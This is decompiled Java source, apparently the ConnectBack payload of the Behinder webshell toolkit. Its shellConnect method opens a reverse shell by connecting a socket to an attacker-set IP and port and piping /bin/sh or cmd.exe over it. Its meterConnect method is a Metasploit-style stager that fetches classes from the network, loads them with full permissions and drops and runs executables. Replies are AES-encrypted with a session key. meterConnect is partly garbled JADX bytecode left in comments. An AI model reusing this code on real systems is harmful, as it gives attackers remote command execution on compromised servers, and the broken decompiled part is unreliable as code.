package net.rebeyond.behinder.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.*;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.*;

public class ConnectBack extends ClassLoader implements Runnable {
    private static final String JAVA_HOME = System.getProperty("java.home");
    private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
    private static final String PATH_SEP = System.getProperty("path.separator");
    private static final boolean IS_AIX = "aix".equals(OS_NAME);
    private static final boolean IS_DOS = PATH_SEP.equals(";");
    public static String ip;
    public static String port;
    public static String type;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    InputStream dn;
    OutputStream rm;

    public ConnectBack(InputStream dn2, OutputStream rm2) {
        this.dn = dn2;
        this.rm = rm2;
    }

    public ConnectBack() {
    }

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        Map<String, String> result = new HashMap<>();
        try {
            if (type.equals("shell")) {
                shellConnect();
            } else if (type.equals("meter")) {
                meterConnect();
            }
            result.put("status", "success");
        } catch (Exception e) {
            result.put("status", "fail");
            result.put("msg", e.getMessage());
        }
        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return true;
    }

    public void run() {
        BufferedReader hz = null;
        BufferedWriter cns = null;
        try {
            BufferedReader hz2 = new BufferedReader(new InputStreamReader(this.dn));
            try {
                BufferedWriter cns2 = new BufferedWriter(new OutputStreamWriter(this.rm));
                try {
                    char[] buffer = new char[8192];
                    while (true) {
                        int length = hz2.read(buffer, 0, buffer.length);
                        if (length <= 0) {
                            break;
                        }
                        cns2.write(buffer, 0, length);
                        cns2.flush();
                    }
                    cns = cns2;
                    hz = hz2;
                } catch (Exception e) {
                    cns = cns2;
                    hz = hz2;
                }
            } catch (Exception e2) {
                hz = hz2;
            }
        } catch (Exception e3) {
        }
        if (hz != null) {
            try {
                hz.close();
            } catch (Exception e4) {
                return;
            }
        }
        if (cns != null) {
            try {
                cns.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void shellConnect() throws Exception {
        String ShellPath;
        try {
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                ShellPath = "/bin/sh";
            } else {
                ShellPath = "cmd.exe";
            }
            Socket socket = new Socket(ip, Integer.parseInt(port));
            Process process = Runtime.getRuntime().exec(ShellPath);
            new Thread(new ConnectBack(process.getInputStream(), socket.getOutputStream())).start();
            new Thread(new ConnectBack(socket.getInputStream(), process.getOutputStream())).start();
        } catch (Exception e) {
            throw e;
        }
    }

    public static void main(String[] args) {
        try {
            ConnectBack c = new ConnectBack();
            ip = "192.168.50.53";
            port = "4444";
            c.meterConnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX WARNING: type inference failed for: r19v0, types: [java.io.InputStream] */
    /* JADX WARNING: type inference failed for: r19v1, types: [java.io.InputStream] */
    /* JADX WARNING: type inference failed for: r19v2, types: [java.io.InputStream] */
    /* JADX WARNING: type inference failed for: r19v3 */
    /* JADX WARNING: type inference failed for: r0v16, types: [java.io.ByteArrayInputStream] */
    /* JADX WARNING: type inference failed for: r19v5 */
    /* JADX WARNING: type inference failed for: r19v6 */
    /* JADX WARNING: type inference failed for: r1v18, types: [java.io.InputStream] */
    /* JADX WARNING: type inference failed for: r0v30, types: [java.lang.Object[]] */
    /* JADX WARNING: type inference failed for: r38v10, types: [java.lang.Object[]] */
    /* JADX WARNING: type inference failed for: r19v8, types: [java.io.InputStream] */
    /* JADX WARNING: type inference failed for: r19v9, types: [java.io.InputStream] */
    /* JADX WARNING: type inference failed for: r19v10 */
    /* JADX WARNING: type inference failed for: r19v11 */
    /* JADX WARNING: type inference failed for: r19v12 */
    /* JADX WARNING: type inference failed for: r19v13 */
    /* JADX WARNING: type inference failed for: r0v62, types: [java.io.ByteArrayInputStream] */
    /* JADX WARNING: type inference failed for: r19v14 */
    /* JADX WARNING: type inference failed for: r19v15 */
    /* JADX WARNING: Multi-variable type inference failed. Error: jadx.core.utils.exceptions.JadxRuntimeException: No candidate types for var: r19v3
  assigns: []
  uses: []
  mth insns count: 350
    	at jadx.core.dex.visitors.typeinference.TypeSearch.fillTypeCandidates(TypeSearch.java:237)
    	at java.util.ArrayList.forEach(ArrayList.java:1257)
    	at jadx.core.dex.visitors.typeinference.TypeSearch.run(TypeSearch.java:53)
    	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runMultiVariableSearch(TypeInferenceVisitor.java:99)
    	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:92)
    	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:27)
    	at jadx.core.dex.visitors.DepthTraversal.lambda$visit$1(DepthTraversal.java:14)
    	at java.util.ArrayList.forEach(ArrayList.java:1257)
    	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:14)
    	at jadx.core.ProcessClass.process(ProcessClass.java:30)
    	at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:311)
    	at jadx.api.JavaClass.decompile(JavaClass.java:62)
    	at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:217)
     */
    /* JADX WARNING: Unknown variable types count: 9 */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private void meterConnect() throws java.lang.Exception {
        /*
            r41 = this;
            java.util.Properties r26 = new java.util.Properties
            r26.<init>()
            java.lang.Class<net.rebeyond.behinder.payload.java.ConnectBack> r8 = net.rebeyond.behinder.payload.java.ConnectBack.class
            java.lang.StringBuilder r36 = new java.lang.StringBuilder
            java.lang.String r37 = r8.getName()
            r38 = 46
            r39 = 47
            java.lang.String r37 = r37.replace(r38, r39)
            java.lang.String r37 = java.lang.String.valueOf(r37)
            r36.<init>(r37)
            java.lang.String r37 = ".class"
            java.lang.StringBuilder r36 = r36.append(r37)
            java.lang.String r9 = r36.toString()
            java.lang.String r36 = "LHOST"
            java.lang.String r37 = ip
            r0 = r26
            r1 = r36
            r2 = r37
            r0.put(r1, r2)
            java.lang.String r36 = "LPORT"
            java.lang.String r37 = port
            r0 = r26
            r1 = r36
            r2 = r37
            r0.put(r1, r2)
            java.lang.String r36 = "Executable"
            r0 = r26
            r1 = r36
            java.lang.String r15 = r0.getProperty(r1)
            if (r15 == 0) goto L_0x009c
            java.lang.String r36 = "~spawn"
            java.lang.String r37 = ".tmp"
            java.io.File r12 = java.io.File.createTempFile(r36, r37)
            r12.delete()
            java.io.File r33 = new java.io.File
            java.lang.StringBuilder r36 = new java.lang.StringBuilder
            java.lang.String r37 = r12.getAbsolutePath()
            java.lang.String r37 = java.lang.String.valueOf(r37)
            r36.<init>(r37)
            java.lang.String r37 = ".dir"
            java.lang.StringBuilder r36 = r36.append(r37)
            java.lang.String r36 = r36.toString()
            r0 = r33
            r1 = r36
            r0.<init>(r1)
            r33.mkdir()
            java.io.File r14 = new java.io.File
            r0 = r33
            r14.<init>(r0, r15)
            writeEmbeddedFile(r8, r15, r14)
            java.lang.String r36 = "Executable"
            r0 = r26
            r1 = r36
            r0.remove(r1)
            java.lang.String r36 = "DroppedExecutable"
            java.lang.String r37 = r14.getCanonicalPath()
            r0 = r26
            r1 = r36
            r2 = r37
            r0.put(r1, r2)
        L_0x009c:
            java.lang.String r36 = "Spawn"
            java.lang.String r37 = "0"
            r0 = r26
            r1 = r36
            r2 = r37
            java.lang.String r36 = r0.getProperty(r1, r2)
            int r29 = java.lang.Integer.parseInt(r36)
            java.lang.String r36 = "DroppedExecutable"
            r0 = r26
            r1 = r36
            java.lang.String r10 = r0.getProperty(r1)
            if (r29 <= 0) goto L_0x0208
            java.lang.String r36 = "Spawn"
            int r37 = r29 + -1
            java.lang.String r37 = java.lang.String.valueOf(r37)
            r0 = r26
            r1 = r36
            r2 = r37
            r0.setProperty(r1, r2)
            java.lang.String r36 = "~spawn"
            java.lang.String r37 = ".tmp"
            java.io.File r12 = java.io.File.createTempFile(r36, r37)
            r12.delete()
            java.io.File r33 = new java.io.File
            java.lang.StringBuilder r36 = new java.lang.StringBuilder
            java.lang.String r37 = r12.getAbsolutePath()
            java.lang.String r37 = java.lang.String.valueOf(r37)
            r36.<init>(r37)
            java.lang.String r37 = ".dir"
            java.lang.StringBuilder r36 = r36.append(r37)
            java.lang.String r36 = r36.toString()
            r0 = r33
            r1 = r36
            r0.<init>(r1)
            java.io.File r25 = new java.io.File
            java.lang.String r36 = "metasploit.dat"
            r0 = r25
            r1 = r33
            r2 = r36
            r0.<init>(r1, r2)
            java.io.File r7 = new java.io.File
            r0 = r33
            r7.<init>(r0, r9)
            java.io.File r36 = r7.getParentFile()
            r36.mkdirs()
            writeEmbeddedFile(r8, r9, r7)
            java.lang.String r36 = "URL"
            java.lang.String r37 = ""
            r0 = r26
            r1 = r36
            r2 = r37
            java.lang.String r36 = r0.getProperty(r1, r2)
            java.lang.String r37 = "https:"
            boolean r36 = r36.startsWith(r37)
            if (r36 == 0) goto L_0x013e
            java.lang.String r36 = "metasploit/PayloadTrustManager.class"
            java.io.File r37 = new java.io.File
            java.io.File r38 = r7.getParentFile()
            java.lang.String r39 = "PayloadTrustManager.class"
            r37.<init>(r38, r39)
            r0 = r36
            r1 = r37
            writeEmbeddedFile(r8, r0, r1)
        L_0x013e:
            java.lang.String r36 = "AESPassword"
            r37 = 0
            r0 = r26
            r1 = r36
            r2 = r37
            java.lang.String r36 = r0.getProperty(r1, r2)
            if (r36 == 0) goto L_0x0162
            java.lang.String r36 = "metasploit/AESEncryption.class"
            java.io.File r37 = new java.io.File
            java.io.File r38 = r7.getParentFile()
            java.lang.String r39 = "AESEncryption.class"
            r37.<init>(r38, r39)
            r0 = r36
            r1 = r37
            writeEmbeddedFile(r8, r0, r1)
        L_0x0162:
            java.io.FileOutputStream r17 = new java.io.FileOutputStream
            r0 = r17
            r1 = r25
            r0.<init>(r1)
            java.lang.String r36 = ""
            r0 = r26
            r1 = r17
            r2 = r36
            r0.store(r1, r2)
            r17.close()
            java.lang.Runtime r36 = java.lang.Runtime.getRuntime()
            r37 = 4
            r0 = r37
            java.lang.String[] r0 = new java.lang.String[r0]
            r37 = r0
            r38 = 0
            java.lang.String r39 = "java"
            java.lang.String r39 = getJreExecutable(r39)
            r37[r38] = r39
            r38 = 1
            java.lang.String r39 = "-classpath"
            r37[r38] = r39
            r38 = 2
            java.lang.String r39 = r33.getAbsolutePath()
            r37[r38] = r39
            r38 = 3
            java.lang.String r39 = r8.getName()
            r37[r38] = r39
            java.lang.Process r24 = r36.exec(r37)
            java.io.InputStream r36 = r24.getInputStream()
            r36.close()
            java.io.InputStream r36 = r24.getErrorStream()
            r36.close()
            r36 = 2000(0x7d0, double:9.88E-321)
            java.lang.Thread.sleep(r36)
            r36 = 4
            r0 = r36
            java.io.File[] r0 = new java.io.File[r0]
            r16 = r0
            r36 = 0
            r16[r36] = r7
            r36 = 1
            java.io.File r37 = r7.getParentFile()
            r16[r36] = r37
            r36 = 2
            r16[r36] = r25
            r36 = 3
            r16[r36] = r33
            r18 = 0
        L_0x01da:
            r0 = r16
            int r0 = r0.length
            r36 = r0
            r0 = r18
            r1 = r36
            if (r0 < r1) goto L_0x01e6
        L_0x01e5:
            return
        L_0x01e6:
            r20 = 0
        L_0x01e8:
            r36 = 10
            r0 = r20
            r1 = r36
            if (r0 < r1) goto L_0x01f3
        L_0x01f0:
            int r18 = r18 + 1
            goto L_0x01da
        L_0x01f3:
            r36 = r16[r18]
            boolean r36 = r36.delete()
            if (r36 != 0) goto L_0x01f0
            r36 = r16[r18]
            r36.deleteOnExit()
            r36 = 100
            java.lang.Thread.sleep(r36)
            int r20 = r20 + 1
            goto L_0x01e8
        L_0x0208:
            if (r10 == 0) goto L_0x028a
            java.io.File r11 = new java.io.File
            r11.<init>(r10)
            boolean r36 = IS_DOS
            if (r36 != 0) goto L_0x023e
            java.lang.Class<java.io.File> r36 = java.io.File.class
            java.lang.String r37 = "setExecutable"
            r38 = 1
            r0 = r38
            java.lang.Class[] r0 = new java.lang.Class[r0]     // Catch:{ NoSuchMethodException -> 0x0260 }
            r38 = r0
            r39 = 0
            java.lang.Class r40 = java.lang.Boolean.TYPE     // Catch:{ NoSuchMethodException -> 0x0260 }
            r38[r39] = r40     // Catch:{ NoSuchMethodException -> 0x0260 }
            java.lang.reflect.Method r36 = r36.getMethod(r37, r38)     // Catch:{ NoSuchMethodException -> 0x0260 }
            r37 = 1
            r0 = r37
            java.lang.Object[] r0 = new java.lang.Object[r0]     // Catch:{ NoSuchMethodException -> 0x0260 }
            r37 = r0
            r38 = 0
            java.lang.Boolean r39 = java.lang.Boolean.TRUE     // Catch:{ NoSuchMethodException -> 0x0260 }
            r37[r38] = r39     // Catch:{ NoSuchMethodException -> 0x0260 }
            r0 = r36
            r1 = r37
            r0.invoke(r11, r1)     // Catch:{ NoSuchMethodException -> 0x0260 }
        L_0x023e:
            java.lang.Runtime r36 = java.lang.Runtime.getRuntime()
            r37 = 1
            r0 = r37
            java.lang.String[] r0 = new java.lang.String[r0]
            r37 = r0
            r38 = 0
            r37[r38] = r10
            r36.exec(r37)
            boolean r36 = IS_DOS
            if (r36 != 0) goto L_0x01e5
            r11.delete()
            java.io.File r36 = r11.getParentFile()
            r36.delete()
            goto L_0x01e5
        L_0x0260:
            r13 = move-exception
            java.lang.Runtime r36 = java.lang.Runtime.getRuntime()     // Catch:{ Exception -> 0x0285 }
            r37 = 3
            r0 = r37
            java.lang.String[] r0 = new java.lang.String[r0]     // Catch:{ Exception -> 0x0285 }
            r37 = r0
            r38 = 0
            java.lang.String r39 = "chmod"
            r37[r38] = r39     // Catch:{ Exception -> 0x0285 }
            r38 = 1
            java.lang.String r39 = "+x"
            r37[r38] = r39     // Catch:{ Exception -> 0x0285 }
            r38 = 2
            r37[r38] = r10     // Catch:{ Exception -> 0x0285 }
            java.lang.Process r36 = r36.exec(r37)     // Catch:{ Exception -> 0x0285 }
            r36.waitFor()     // Catch:{ Exception -> 0x0285 }
            goto L_0x023e
        L_0x0285:
            r13 = move-exception
            r13.printStackTrace()
            goto L_0x023e
        L_0x028a:
            java.lang.String r36 = "LPORT"
            java.lang.String r37 = "4444"
            r0 = r26
            r1 = r36
            r2 = r37
            java.lang.String r36 = r0.getProperty(r1, r2)
            int r22 = java.lang.Integer.parseInt(r36)
            java.lang.String r36 = "LHOST"
            r37 = 0
            r0 = r26
            r1 = r36
            r2 = r37
            java.lang.String r21 = r0.getProperty(r1, r2)
            java.lang.String r36 = "URL"
            r37 = 0
            r0 = r26
            r1 = r36
            r2 = r37
            java.lang.String r35 = r0.getProperty(r1, r2)
            if (r22 > 0) goto L_0x037f
            java.io.InputStream r19 = java.lang.System.in
            java.io.PrintStream r23 = java.lang.System.out
        L_0x02be:
            java.lang.String r36 = "AESPassword"
            r37 = 0
            r0 = r26
            r1 = r36
            r2 = r37
            java.lang.String r6 = r0.getProperty(r1, r2)
            if (r6 == 0) goto L_0x031c
            java.lang.String r36 = "metasploit.AESEncryption"
            java.lang.Class r36 = java.lang.Class.forName(r36)
            java.lang.String r37 = "wrapStreams"
            r38 = 3
            r0 = r38
            java.lang.Class[] r0 = new java.lang.Class[r0]
            r38 = r0
            r39 = 0
            java.lang.Class<java.io.InputStream> r40 = java.io.InputStream.class
            r38[r39] = r40
            r39 = 1
            java.lang.Class<java.io.OutputStream> r40 = java.io.OutputStream.class
            r38[r39] = r40
            r39 = 2
            java.lang.Class<java.lang.String> r40 = java.lang.String.class
            r38[r39] = r40
            java.lang.reflect.Method r36 = r36.getMethod(r37, r38)
            r37 = 0
            r38 = 3
            r0 = r38
            java.lang.Object[] r0 = new java.lang.Object[r0]
            r38 = r0
            r39 = 0
            r38[r39] = r19
            r39 = 1
            r38[r39] = r23
            r39 = 2
            r38[r39] = r6
            java.lang.Object r32 = r36.invoke(r37, r38)
            java.lang.Object[] r32 = (java.lang.Object[]) r32
            r36 = 0
            r19 = r32[r36]
            java.io.InputStream r19 = (java.io.InputStream) r19
            r36 = 1
            r23 = r32[r36]
            java.io.OutputStream r23 = (java.io.OutputStream) r23
        L_0x031c:
            java.util.StringTokenizer r30 = new java.util.StringTokenizer
            java.lang.StringBuilder r36 = new java.lang.StringBuilder
            java.lang.String r37 = "Payload -- "
            r36.<init>(r37)
            java.lang.String r37 = "StageParameters"
            java.lang.String r38 = ""
            r0 = r26
            r1 = r37
            r2 = r38
            java.lang.String r37 = r0.getProperty(r1, r2)
            java.lang.StringBuilder r36 = r36.append(r37)
            java.lang.String r36 = r36.toString()
            java.lang.String r37 = " "
            r0 = r30
            r1 = r36
            r2 = r37
            r0.<init>(r1, r2)
            int r36 = r30.countTokens()
            r0 = r36
            java.lang.String[] r0 = new java.lang.String[r0]
            r31 = r0
            r18 = 0
        L_0x0352:
            r0 = r31
            int r0 = r0.length
            r36 = r0
            r0 = r18
            r1 = r36
            if (r0 < r1) goto L_0x0420
            net.rebeyond.behinder.payload.java.ConnectBack r36 = new net.rebeyond.behinder.payload.java.ConnectBack
            r36.<init>()
            java.lang.String r37 = "EmbeddedStage"
            r38 = 0
            r0 = r26
            r1 = r37
            r2 = r38
            java.lang.String r37 = r0.getProperty(r1, r2)
            r0 = r36
            r1 = r19
            r2 = r23
            r3 = r37
            r4 = r31
            r0.bootstrap(r1, r2, r3, r4)
            goto L_0x01e5
        L_0x037f:
            if (r35 == 0) goto L_0x03f8
            java.lang.String r36 = "raw:"
            boolean r36 = r35.startsWith(r36)
            if (r36 == 0) goto L_0x03a5
            java.io.ByteArrayInputStream r19 = new java.io.ByteArrayInputStream
            r36 = 4
            java.lang.String r36 = r35.substring(r36)
            java.lang.String r37 = "ISO-8859-1"
            byte[] r36 = r36.getBytes(r37)
            r0 = r19
            r1 = r36
            r0.<init>(r1)
        L_0x039e:
            java.io.ByteArrayOutputStream r23 = new java.io.ByteArrayOutputStream
            r23.<init>()
            goto L_0x02be
        L_0x03a5:
            java.lang.String r36 = "https:"
            boolean r36 = r35.startsWith(r36)
            if (r36 == 0) goto L_0x03ea
            java.net.URL r36 = new java.net.URL
            r0 = r36
            r1 = r35
            r0.<init>(r1)
            java.net.URLConnection r34 = r36.openConnection()
            java.lang.String r36 = "metasploit.PayloadTrustManager"
            java.lang.Class r36 = java.lang.Class.forName(r36)
            java.lang.String r37 = "useFor"
            r38 = 1
            r0 = r38
            java.lang.Class[] r0 = new java.lang.Class[r0]
            r38 = r0
            r39 = 0
            java.lang.Class<java.net.URLConnection> r40 = java.net.URLConnection.class
            r38[r39] = r40
            java.lang.reflect.Method r36 = r36.getMethod(r37, r38)
            r37 = 0
            r38 = 1
            r0 = r38
            java.lang.Object[] r0 = new java.lang.Object[r0]
            r38 = r0
            r39 = 0
            r38[r39] = r34
            r36.invoke(r37, r38)
            java.io.InputStream r19 = r34.getInputStream()
            goto L_0x039e
        L_0x03ea:
            java.net.URL r36 = new java.net.URL
            r0 = r36
            r1 = r35
            r0.<init>(r1)
            java.io.InputStream r19 = r36.openStream()
            goto L_0x039e
        L_0x03f8:
            if (r21 == 0) goto L_0x040f
            java.net.Socket r28 = new java.net.Socket
            r0 = r28
            r1 = r21
            r2 = r22
            r0.<init>(r1, r2)
        L_0x0405:
            java.io.InputStream r19 = r28.getInputStream()
            java.io.OutputStream r23 = r28.getOutputStream()
            goto L_0x02be
        L_0x040f:
            java.net.ServerSocket r27 = new java.net.ServerSocket
            r0 = r27
            r1 = r22
            r0.<init>(r1)
            java.net.Socket r28 = r27.accept()
            r27.close()
            goto L_0x0405
        L_0x0420:
            java.lang.String r36 = r30.nextToken()
            r31[r18] = r36
            int r18 = r18 + 1
            goto L_0x0352
        */
        throw new UnsupportedOperationException("Method not decompiled: net.rebeyond.behinder.payload.java.ConnectBack.meterConnect():void");
    }

    private static void writeEmbeddedFile(Class clazz, String resourceName, File targetFile) throws IOException {
        InputStream in = clazz.getResourceAsStream("/" + resourceName);
        FileOutputStream fos = new FileOutputStream(targetFile);
        byte[] buf = new byte[4096];
        while (true) {
            int len = in.read(buf);
            if (len == -1) {
                fos.close();
                return;
            }
            fos.write(buf, 0, len);
        }
    }

    private final void bootstrap(InputStream rawIn, OutputStream out, String embeddedStageName, String[] stageParameters) throws Exception {
        Class clazz;
        try {
            DataInputStream in = new DataInputStream(rawIn);
            Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
            if (embeddedStageName == null) {
                int length = in.readInt();
                do {
                    byte[] classfile = new byte[length];
                    in.readFully(classfile);
                    clazz = defineClass(null, classfile, 0, length, pd);
                    resolveClass(clazz);
                    length = in.readInt();
                } while (length > 0);
            } else {
                clazz = Class.forName("javapayload.stage." + embeddedStageName);
            }
            Object stage = clazz.newInstance();
            clazz.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, in, out, stageParameters);
        } catch (Throwable t) {
            t.printStackTrace();
            t.printStackTrace(new PrintStream(out));
        }
    }

    private static String getJreExecutable(String command) {
        File jExecutable = null;
        if (IS_AIX) {
            jExecutable = findInDir(JAVA_HOME + "/sh", command);
        }
        if (jExecutable == null) {
            jExecutable = findInDir(JAVA_HOME + "/bin", command);
        }
        if (jExecutable != null) {
            return jExecutable.getAbsolutePath();
        }
        return addExtension(command);
    }

    private static String addExtension(String command) {
        return command + (IS_DOS ? ".exe" : "");
    }

    private static File findInDir(String dirName, String commandName) {
        File dir = normalize(dirName);
        if (!dir.exists()) {
            return null;
        }
        File executable = new File(dir, addExtension(commandName));
        if (!executable.exists()) {
            return null;
        }
        return executable;
    }

    private static File normalize(String path) {
        Stack s = new Stack();
        String[] dissect = dissect(path);
        s.push(dissect[0]);
        StringTokenizer tok = new StringTokenizer(dissect[1], File.separator);
        while (tok.hasMoreTokens()) {
            String thisToken = tok.nextToken();
            if (!".".equals(thisToken)) {
                if (!"..".equals(thisToken)) {
                    s.push(thisToken);
                } else if (s.size() < 2) {
                    return new File(path);
                } else {
                    s.pop();
                }
            }
        }
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < s.size(); i++) {
            if (i > 1) {
                sb.append(File.separatorChar);
            }
            sb.append(s.elementAt(i));
        }
        return new File(sb.toString());
    }

    private static String[] dissect(String path) {
        String root;
        String path2;
        char sep = File.separatorChar;
        String path3 = path.replace('/', sep).replace('\\', sep);
        int colon = path3.indexOf(58);
        if (colon > 0 && IS_DOS) {
            int next = colon + 1;
            String root2 = path3.substring(0, next);
            char[] ca = path3.toCharArray();
            root = root2 + sep;
            if (ca[next] == sep) {
                next++;
            }
            StringBuffer sbPath = new StringBuffer();
            for (int i = next; i < ca.length; i++) {
                if (ca[i] != sep || ca[i - 1] != sep) {
                    sbPath.append(ca[i]);
                }
            }
            path2 = sbPath.toString();
        } else if (path3.length() <= 1 || path3.charAt(1) != sep) {
            root = File.separator;
            path2 = path3.substring(1);
        } else {
            int nextsep = path3.indexOf(sep, path3.indexOf(sep, 2) + 1);
            if (nextsep > 2) {
                root = path3.substring(0, nextsep + 1);
            } else {
                root = path3;
            }
            path2 = path3.substring(root.length());
        }
        return new String[]{root, path2};
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes(StandardCharsets.UTF_8)});
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder2, new Object[]{value.getBytes(StandardCharsets.UTF_8)})).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getAttribute("u").toString().getBytes(StandardCharsets.UTF_8), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }
}
